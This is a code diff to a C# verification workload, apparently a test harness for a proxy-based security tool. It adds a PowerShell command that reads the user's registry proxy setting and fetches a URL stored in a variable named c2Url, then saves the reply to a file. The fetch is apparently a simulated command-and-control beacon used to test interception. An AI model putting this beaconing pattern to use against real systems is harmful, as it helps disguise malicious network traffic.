@@ -45,7 +45,10 @@ class VerificationWorkload {
                     if (!proxyReady) Thread.Sleep(1000);
                 }
                 if (!proxyReady) throw new Exception("Treatment proxy was not configured");
-                string retry = "$response = Invoke-WebRequest -UseBasicParsing -Uri '" + c2Url +
+                // Windows may bypass a private IP in its default proxy policy.
+                // This client opts in to the proxy ADAM installed, without
+                // inventing or hard-coding the proxy's ephemeral port.
+                string retry = "$proxy = (Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings').ProxyServer; $response = Invoke-WebRequest -UseBasicParsing -Proxy $proxy -Uri '" + c2Url +
                     "' -TimeoutSec 10; $body = if ($response.Content -is [byte[]]) { [Text.Encoding]::UTF8.GetString($response.Content) } else { [string]$response.Content }; [IO.File]::WriteAllText('" + responseFile + "', $body)";
                 var retryChild = Process.Start(new ProcessStartInfo(
                     Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"WindowsPowerShell\v1.0\powershell.exe"),
